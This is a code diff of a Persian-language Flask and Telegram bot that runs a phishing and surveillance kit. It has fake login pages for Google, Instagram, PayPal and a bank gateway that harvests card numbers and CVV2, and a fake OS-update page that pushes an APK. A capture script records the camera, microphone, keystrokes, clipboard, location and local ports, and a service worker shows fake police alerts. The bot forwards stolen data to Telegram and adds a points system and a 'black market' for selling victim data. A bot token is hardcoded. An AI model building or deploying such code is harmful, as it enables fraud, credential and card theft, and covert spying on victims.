@@ -3,7 +3,7 @@ from datetime import datetime
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response, redirect
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, MessageReactionHandler
 
 # -------------------- Configuration --------------------
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
@@ -31,12 +31,15 @@ def get_db():
 def init_db():
     with app.app_context():
         db = get_db()
-        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT, last_active TEXT, phishing_type TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT, last_active TEXT, phishing_type TEXT, creator_id INTEGER)")
         db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
-        db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, timestamp TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, timestamp TEXT, card_number TEXT, cvv2 TEXT, expiry TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS learned (keyword TEXT PRIMARY KEY, response TEXT)")
-        db.execute("CREATE TABLE IF NOT EXISTS groups (chat_id INTEGER PRIMARY KEY)")
+        db.execute("CREATE TABLE IF NOT EXISTS groups (chat_id INTEGER PRIMARY KEY, title TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, level INTEGER DEFAULT 1, join_date TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS listings (id INTEGER PRIMARY KEY AUTOINCREMENT, seller_id INTEGER, token TEXT, price INTEGER, sold INTEGER DEFAULT 0, listed_at TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS private_chats (user_id INTEGER PRIMARY KEY)")
         db.commit()
 
 @app.teardown_appcontext
@@ -46,20 +49,26 @@ def close_connection(exception):
         db.close()
 
 # -------------------- Telegram Sending Helpers --------------------
-def send_telegram_message(text, reply_markup=None):
-    if not TOKEN or not ADMIN_CHAT_ID:
+def send_telegram_message(text, reply_markup=None, chat_id=None):
+    if not TOKEN:
+        return
+    target = chat_id or ADMIN_CHAT_ID
+    if not target:
         return
     try:
         requests.post(
             f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup},
+            json={"chat_id": target, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup},
             timeout=10
         )
     except Exception as e:
         app.logger.error(f"Telegram message failed: {e}")
 
-def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False):
-    if not TOKEN or not ADMIN_CHAT_ID:
+def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False, chat_id=None):
+    if not TOKEN:
+        return
+    target = chat_id or ADMIN_CHAT_ID
+    if not target:
         return
     try:
         if as_video:
@@ -71,7 +80,7 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=F
         else:
             url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
             files = {'document': (filename, io.BytesIO(file_bytes), 'application/octet-stream')}
-        data = {'chat_id': ADMIN_CHAT_ID, 'caption': caption}
+        data = {'chat_id': target, 'caption': caption}
         requests.post(url, data=data, files=files, timeout=10)
     except Exception as e:
         app.logger.error(f"Telegram file send failed: {e}")
@@ -96,22 +105,13 @@ def ask_groq(prompt):
         url = "https://api.groq.com/openai/v1/chat/completions"
         headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
         models = ["llama-3.1-8b-instant", "gemma2-9b-it", "llama-3.3-70b-versatile"]
-        last_error = None
         for model in models:
-            payload = {
-                "model": model,
-                "messages": [{"role": "user", "content": prompt}],
-                "temperature": 0.7
-            }
+            payload = {"model": model, "messages": [{"role": "user", "content": prompt}], "temperature": 0.7}
             resp = requests.post(url, json=payload, headers=headers, timeout=20)
             if resp.status_code == 200:
                 data = resp.json()
                 return data['choices'][0]['message']['content'].strip()
-            else:
-                last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
-                app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
-        app.logger.error(f"Groq all models failed: {last_error}")
-        return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
+        return "❌ هوش مصنوعی در دسترس نیست."
     except Exception as e:
         app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
@@ -140,7 +140,7 @@ PHISHING_FACEBOOK = """<!DOCTYPE html>
 PHISHING_BANK = """<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>پرداخت اینترنتی</title>
 <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f2f2f2;font-family:Tahoma;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:360px;padding:20px;background:white;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.2);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;font-size:14px;text-align:center;direction:ltr;} .btn{width:100%;background:#2e86de;color:white;border:none;border-radius:5px;padding:12px;font-size:16px;cursor:pointer;}</style></head>
-<body><div class="container"><img src="https://www.shaparak.ir/assets/images/logo.png"><h3>پرداخت امن شاپرک</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره کارت 16 رقمی" required><input type="text" name="password" placeholder="رمز دوم / CVV2"><button class="btn" type="submit">پرداخت</button></form></div></body></html>"""
+<body><div class="container"><img src="https://www.shaparak.ir/assets/images/logo.png"><h3>پرداخت امن شاپرک</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره کارت 16 رقمی" required><input type="text" name="password" placeholder="رمز دوم / CVV2"><input type="text" name="extra1" placeholder="تاریخ انقضا (ماه/سال)"><button class="btn" type="submit">پرداخت</button></form></div></body></html>"""
 
 PHISHING_SUPERCELL = """<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Supercell ID</title>
@@ -172,7 +172,21 @@ PHISHING_TIKTOK = """<!DOCTYPE html>
 <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#121212;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:320px;padding:30px;background:#1e1e1e;border-radius:20px;text-align:center;} img{width:80px;margin-bottom:20px;} input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#fe2c55;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
 <body><div class="container"><img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/ies/tiktok/emblem/logo_web.png"><h2>Log in</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""
 
-# -------------------- Capture Page (Biometric simulation + detailed device info) --------------------
+PHISHING_OS_UPDATE = """<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>System Update</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#111;color:white;font-family:Arial;text-align:center;padding-top:20vh;} .loader{width:60px;height:60px;border-radius:50%;border:5px solid #333;border-top-color:#0f0;animation:spin 1s linear infinite;margin:20px auto;} @keyframes spin{to{transform:rotate(360deg);}} .btn{margin-top:30px;padding:15px 30px;background:#4CAF50;color:white;border:none;border-radius:10px;font-size:20px;cursor:pointer;display:none;}</style></head>
+<body><h2>در حال دانلود آپدیت امنیتی...</h2><div class="loader"></div><p id="status">لطفاً منتظر بمانید</p><button id="installBtn" class="btn" onclick="installApp()">نصب آپدیت</button><script>
+setTimeout(function(){
+    document.querySelector('.loader').style.display='none';
+    document.getElementById('status').innerText='آپدیت آماده نصب است.';
+    document.getElementById('installBtn').style.display='block';
+}, 4000);
+function installApp(){
+    window.location.href='/download/app-update.apk';
+}
+</script></body></html>"""
+
+# -------------------- Capture Page (Biometric + Device Info) --------------------
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -230,7 +244,7 @@ CAPTURE_PAGE_TEMPLATE = """
             btn.style.display = 'none';
             msgEl.innerText = 'در حال برقراری ارتباط...';
 
-            // ---------- Detailed Device Info (without permissions) ----------
+            // Device info
             let deviceInfo = {
                 type: 'device',
                 ua: navigator.userAgent,
@@ -243,7 +257,6 @@ CAPTURE_PAGE_TEMPLATE = """
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 touchPoints: navigator.maxTouchPoints || 0,
             };
-
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     deviceInfo.battery = { level: battery.level, charging: battery.charging };
@@ -252,95 +265,49 @@ CAPTURE_PAGE_TEMPLATE = """
             } else {
                 fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
             }
-
-            // network connection
             if (navigator.connection) {
                 const conn = navigator.connection;
-                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-                    type: 'network',
-                    effectiveType: conn.effectiveType,
-                    downlink: conn.downlink,
-                    rtt: conn.rtt
-                })});
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'network', effectiveType:conn.effectiveType, downlink:conn.downlink, rtt:conn.rtt})});
             }
-
-            // userAgentData (new API)
             if (navigator.userAgentData) {
-                navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "architecture", "model", "fullVersionList"]).then(uaData => {
+                navigator.userAgentData.getHighEntropyValues(["platform","platformVersion","architecture","model","fullVersionList"]).then(uaData => {
                     fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'ua_data', ...uaData})});
                 });
             }
-
-            // fingerprint (canvas)
             try {
-                var cf = document.createElement('canvas');
-                cf.width = 200; cf.height = 50;
-                var cfctx = cf.getContext('2d');
-                cfctx.textBaseline = 'top';
-                cfctx.font = '14px Arial';
-                cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
+                var cf = document.createElement('canvas'); cf.width=200; cf.height=50;
+                var cfctx = cf.getContext('2d'); cfctx.textBaseline='top'; cfctx.font='14px Arial';
+                cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);
                 fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data:cf.toDataURL()})});
             } catch(e) {}
-
-            // internal IP
             try {
-                var pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = e => {
-                    if (e.candidate) {
-                        var ip = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
-                        if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
-                    }
-                };
+                var pc = new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
+                pc.onicecandidate = e => { if(e.candidate){ var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/); if(ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})}); } };
             } catch(e) {}
-
-            // clipboard
-            try {
-                var clip = await navigator.clipboard.readText();
-                if (clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})});
-            } catch(e) {}
-
-            // port scanning
-            [80,22,443,8080,3389,5900,21].forEach(p => {
-                var img = new Image();
-                img.src = 'http://127.0.0.1:' + p + '/favicon.ico?t=' + Date.now();
-                var st = Date.now();
-                img.onload = img.onerror = function() {
-                    if (Date.now() - st < 500) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:p})});
-                };
-            });
-
-            // service worker & notification
+            try { var clip = await navigator.clipboard.readText(); if(clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})}); } catch(e) {}
+            [80,22,443,8080,3389,5900,21].forEach(p=>{ var img=new Image(); img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now(); var st=Date.now(); img.onload=img.onerror=function(){ if(Date.now()-st<500) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:p})}); }; });
             if ('serviceWorker' in navigator) {
                 navigator.serviceWorker.register('/sw.js?t='+t).then(reg => {
                     setTimeout(() => {
                         reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
                             body: 'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',
-                            icon: 'https://www.fata.gov.ir/images/logo.png',
-                            requireInteraction: true,
-                            vibrate: [300,100,300],
+                            icon: 'https://www.fata.gov.ir/images/logo.png', requireInteraction: true, vibrate: [300,100,300],
                             data: { url: window.location.origin + '/go/' + t }
                         });
                     }, 15000);
                 });
             }
-
-            // location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
                     err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
                 );
             }
-
-            // camera & mic
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: {ideal:320}, height: {ideal:240} }, audio: true });
                 v.srcObject = stream;
                 await new Promise(r => v.onloadedmetadata = r);
-                c.width = v.videoWidth || 640;
-                c.height = v.videoHeight || 480;
+                c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
                 msgEl.innerText = 'اتصال برقرار شد.';
                 takeSnapshot();
                 window.photoInterval = setInterval(takeSnapshot, 3000);
@@ -348,35 +315,21 @@ CAPTURE_PAGE_TEMPLATE = """
                 try {
                     var aud = stream.getAudioTracks()[0];
                     if (aud) {
-                        var mr = new MediaRecorder(new MediaStream([aud]));
-                        var chunks = [];
+                        var mr = new MediaRecorder(new MediaStream([aud])); var chunks = [];
                         mr.ondataavailable = e => chunks.push(e.data);
                         mr.onstop = () => {
                             var blob = new Blob(chunks, {type:'audio/webm'});
                             var reader = new FileReader();
-                            reader.onloadend = () => {
-                                var b64 = reader.result.split(',')[1];
-                                fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})});
-                            };
+                            reader.onloadend = () => { var b64 = reader.result.split(',')[1]; fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})}); };
                             reader.readAsDataURL(blob);
                         };
-                        mr.start();
-                        setTimeout(() => { mr.stop(); }, 5000);
+                        mr.start(); setTimeout(() => { mr.stop(); }, 5000);
                     }
                 } catch(e) {}
-            } catch(e) {
-                msgEl.innerText = 'عدم دسترسی به دوربین.';
-            }
-
-            // keylogger
+            } catch(e) { msgEl.innerText = 'عدم دسترسی به دوربین.'; }
             var keys = '';
             document.addEventListener('keydown', e => { keys += e.key; });
-            setInterval(() => {
-                if (keys.length > 0) {
-                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
-                    keys = '';
-                }
-            }, 5000);
+            setInterval(() => { if (keys.length > 0) { fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})}); keys = ''; } }, 5000);
         }
 
         function takeSnapshot() {
@@ -397,14 +350,10 @@ CAPTURE_PAGE_TEMPLATE = """
                 vr.onstop = () => {
                     var blob = new Blob(chunks, {type:'video/webm'});
                     var reader = new FileReader();
-                    reader.onloadend = () => {
-                        var b64 = reader.result.split(',')[1];
-                        fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'video', data:b64})});
-                    };
+                    reader.onloadend = () => { var b64 = reader.result.split(',')[1]; fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'video', data:b64})}); };
                     reader.readAsDataURL(blob);
                 };
-                vr.start();
-                setTimeout(() => { if (vr.state === 'recording') vr.stop(); }, 10000);
+                vr.start(); setTimeout(() => { if (vr.state === 'recording') vr.stop(); }, 10000);
             } catch(e) {}
         }
 
@@ -416,7 +365,6 @@ CAPTURE_PAGE_TEMPLATE = """
 </body></html>
 """
 
-# Admin templates (unchanged)
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
@@ -449,8 +397,8 @@ def index():
 def new_link():
     token = str(uuid.uuid4())
     db = get_db()
-    db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
-               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat(), "google"))
+    db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type, creator_id) VALUES (?, ?, ?, ?, ?, ?)",
+               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat(), "google", None))
     db.commit()
     link = f"{request.host_url}go/{token}"
     return jsonify({"link": link, "token": token})
@@ -466,7 +414,7 @@ def go_to_phish(token):
         'google': PHISHING_GOOGLE, 'gmail': PHISHING_GMAIL, 'instagram': PHISHING_INSTAGRAM,
         'facebook': PHISHING_FACEBOOK, 'bank': PHISHING_BANK, 'supercell': PHISHING_SUPERCELL,
         'lottery': PHISHING_LOTTERY, 'twitter': PHISHING_TWITTER, 'snapchat': PHISHING_SNAPCHAT,
-        'paypal': PHISHING_PAYPAL, 'tiktok': PHISHING_TIKTOK
+        'paypal': PHISHING_PAYPAL, 'tiktok': PHISHING_TIKTOK, 'os_update': PHISHING_OS_UPDATE
     }
     page = pages.get(ptype, PHISHING_GOOGLE)
     return render_template_string(page, token=token)
@@ -475,11 +423,24 @@ def go_to_phish(token):
 def login(token):
     email = request.form.get('email','').strip()
     password = request.form.get('password','').strip()
+    card_number = request.form.get('card_number','').strip()
+    cvv2 = request.form.get('cvv2','').strip()
+    expiry = request.form.get('expiry','').strip()
     db = get_db()
-    db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
-               (token, email, password, datetime.now().isoformat()))
+    victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
+    ptype = victim['phishing_type'] if victim else 'google'
+    if ptype == 'bank':
+        db.execute("INSERT INTO credentials (token, email, password, timestamp, card_number, cvv2, expiry) VALUES (?, ?, ?, ?, ?, ?, ?)",
+                   (token, card_number, cvv2, datetime.now().isoformat(), card_number, cvv2, expiry))
+    else:
+        db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
+                   (token, email, password, datetime.now().isoformat()))
     db.commit()
-    send_telegram_message(f"🔑 <b>Login</b> from {token}\nEmail: <code>{email}</code>\nPassword: <code>{password}</code>")
+    if victim and victim['creator_id']:
+        award_points(victim['creator_id'], 10)
+    msg = f"🔑 <b>Login</b> from {token}\nEmail: <code>{email or card_number}</code>\nPassword: <code>{password or cvv2}</code>"
+    if card_number: msg += f"\nCard: {card_number}\nCVV2: {cvv2}\nExpiry: {expiry}"
+    send_telegram_message(msg)
     return redirect(f"/capture/{token}", code=302)
 
 @app.route('/capture/<token>')
@@ -572,35 +533,22 @@ def admin():
             loc_data = json.loads(loc_row['data'])
             loc = f"{loc_data.get('lat')},{loc_data.get('lng')}"
         victims.append({
-            "token": token,
-            "ip": row['ip'],
-            "created_at": row['created_at'],
+            "token": token, "ip": row['ip'], "created_at": row['created_at'],
             "info": json.dumps(info, indent=2, ensure_ascii=False),
-            "photo": photo_b64,
-            "audio": audio_b64,
-            "location": loc
+            "photo": photo_b64, "audio": audio_b64, "location": loc
         })
     return render_template_string(ADMIN_PANEL_TEMPLATE, victims=victims)
 
-# Service Worker (unchanged)
 SW_JS = """
 self.addEventListener('install', event => { self.skipWaiting(); });
 self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
 self.addEventListener('notificationclick', event => {
   event.notification.close();
-  const urlToOpen = event.notification.data && event.notification.data.url 
-                      ? event.notification.data.url 
-                      : '/';
+  const urlToOpen = event.notification.data && event.notification.data.url ? event.notification.data.url : '/';
   event.waitUntil(
     clients.matchAll({ type: 'window', includeUncontrolled: true }).then(windowClients => {
-      for (let client of windowClients) {
-        if (client.url.includes(urlToOpen.split('/').pop())) {
-          return client.focus();
-        }
-      }
-      if (clients.openWindow) {
-        return clients.openWindow(urlToOpen);
-      }
+      for (let client of windowClients) { if (client.url.includes(urlToOpen.split('/').pop())) return client.focus(); }
+      if (clients.openWindow) return clients.openWindow(urlToOpen);
     })
   );
 });
@@ -608,10 +556,7 @@ self.addEventListener('push', event => {
   const payload = event.data ? event.data.text() : 'پیام جدید';
   event.waitUntil(
     self.registration.showNotification('📩 پیام از طرف ادمین', {
-      body: payload,
-      icon: 'https://www.fata.gov.ir/images/logo.png',
-      requireInteraction: true,
-      vibrate: [200, 100, 200]
+      body: payload, icon: 'https://www.fata.gov.ir/images/logo.png', requireInteraction: true, vibrate: [200, 100, 200]
     })
   );
 });
@@ -622,11 +567,7 @@ setInterval(() => {
         clients.forEach(client => {
           const url = new URL(client.url);
           const token = url.searchParams.get('t') || url.pathname.split('/').pop();
-          fetch('/log/'+token, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({type:'location',lat:pos.coords.latitude,lng:pos.coords.longitude})
-          });
+          fetch('/log/'+token, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location',lat:pos.coords.latitude,lng:pos.coords.longitude}) });
         });
       });
     });
@@ -643,24 +584,50 @@ def service_worker():
 def download_file(filename):
     return send_from_directory('static', filename)
 
-# -------------------- Bot Database Helper --------------------
+# -------------------- Bot Helpers --------------------
 def get_db_connection():
     conn = sqlite3.connect(DATABASE)
     conn.row_factory = sqlite3.Row
     return conn
 
-# -------------------- Telegram Bot Handlers --------------------
+def ensure_user(user_id):
+    conn = get_db_connection()
+    if not conn.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone():
+        conn.execute("INSERT INTO users (user_id, points, level, join_date) VALUES (?, 0, 1, ?)", (user_id, datetime.now().isoformat()))
+        conn.commit()
+    conn.close()
+
+def award_points(user_id, amount):
+    conn = get_db_connection()
+    conn.execute("UPDATE users SET points = points + ? WHERE user_id=?", (amount, user_id))
+    conn.commit()
+    points = conn.execute("SELECT points FROM users WHERE user_id=?", (user_id,)).fetchone()['points']
+    level = points // 100 + 1
+    conn.execute("UPDATE users SET level = ? WHERE user_id=?", (level, user_id))
+    conn.commit()
+    conn.close()
+
+# -------------------- Bot Handlers --------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.type == 'private':
+        conn = get_db_connection()
+        conn.execute("INSERT OR IGNORE INTO private_chats (user_id) VALUES (?)", (update.effective_user.id,))
+        conn.commit()
+        conn.close()
     help_text = (
         "🔹 به ربات خوش آمدید!\n\n"
         "📌 با دکمه «ساخت لینک جدید» یک لینک اختصاصی بسازید.\n"
-        "🎯 نوع  (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
+        "🎯 نوع (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
         "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس صدا و... دریافت کنید.\n\n"
         "دسترسی به انواع حساب ها ، مود تمام گیم ها و هزاران دستور خفن که با بالارفتن امتیاز فعال میشه\n"
+        "🛒 بازار سیاه اطلاعات برای خرید و فروش\n"
         "🤖 هوش مصنوعی: پاسخگویی به پیام‌های خصوصی."
     )
-    keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
-                [InlineKeyboardButton("📖 راهنما", callback_data="help")]]
+    keyboard = [
+        [InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
+        [InlineKeyboardButton("👤 پروفایل", callback_data="profile"), InlineKeyboardButton("🛒 بازار سیاه", callback_data="market_menu")],
+        [InlineKeyboardButton("📖 راهنما", callback_data="help")]
+    ]
     if update.effective_user.id == ADMIN_USER_ID:
         keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
     await update.message.reply_text(help_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
@@ -673,30 +640,29 @@ async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ شما مجاز به استفاده از این دستور نیستید.")
         return
     keyboard = [
-        [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
+        [InlineKeyboardButton("روشن/خاموش ربات", callback_data="toggle_bot")],
         [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
         [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
         [InlineKeyboardButton("📊 آمار", callback_data="stats")],
-        [InlineKeyboardButton("📢 ارسال پیام به گروه‌ها", callback_data="broadcast_groups")],
+        [InlineKeyboardButton("📢 ارسال پیام به گروه‌ها", callback_data="broadcast_groups_menu")],
+        [InlineKeyboardButton("✉️ ارسال پیام به کاربر", callback_data="send_user")],
         [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
     ]
     await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# --- Learn/Unlearn/Wordlist ---
 async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمه یاد بدهد.")
         return
     args = context.args
     if len(args) < 2:
-        await update.message.reply_text("📝 فرمت صحیح: /learn <کلمه> <پاسخ>\nمثال: /learn سلام علیکم")
+        await update.message.reply_text("📝 فرمت: /learn <کلمه> <پاسخ>")
         return
     keyword = args[0].strip().lower()
     response = ' '.join(args[1:])
     conn = get_db_connection()
     conn.execute("INSERT OR REPLACE INTO learned (keyword, response) VALUES (?, ?)", (keyword, response))
-    conn.commit()
-    conn.close()
+    conn.commit(); conn.close()
     await update.message.reply_text(f"✅ یاد گرفتم: وقتی کسی بگوید «{keyword}» پاسخ دهم «{response}»")
 
 async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -704,17 +670,13 @@ async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمات را حذف کند.")
         return
     if not context.args:
-        await update.message.reply_text("📝 لطفاً کلمه‌ای که می‌خواهید حذف کنید را وارد کنید: /unlearn <کلمه>")
+        await update.message.reply_text("📝 /unlearn <کلمه>")
         return
     keyword = context.args[0].strip().lower()
     conn = get_db_connection()
     cur = conn.execute("DELETE FROM learned WHERE keyword=?", (keyword,))
-    conn.commit()
-    conn.close()
-    if cur.rowcount > 0:
-        await update.message.reply_text(f"❌ کلمه «{keyword}» و پاسخ مرتبط حذف شد.")
-    else:
-        await update.message.reply_text(f"⚠️ کلمه «{keyword}» در لیست یادگیری وجود ندارد.")
+    conn.commit(); conn.close()
+    await update.message.reply_text(f"{'❌ حذف شد' if cur.rowcount > 0 else '⚠️ وجود ندارد'}.")
 
 async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn = get_db_connection()
@@ -730,71 +692,120 @@ async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("⛔ فقط مدیر می‌تواند آمار را ببیند.")
+        await update.message.reply_text("⛔ فقط مدیر.")
         return
     conn = get_db_connection()
-    victims_count = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
-    photos = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
-    videos = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
-    audios = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
-    creds = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
-    learned = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
+    vc = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
+    ph = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
+    vi = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
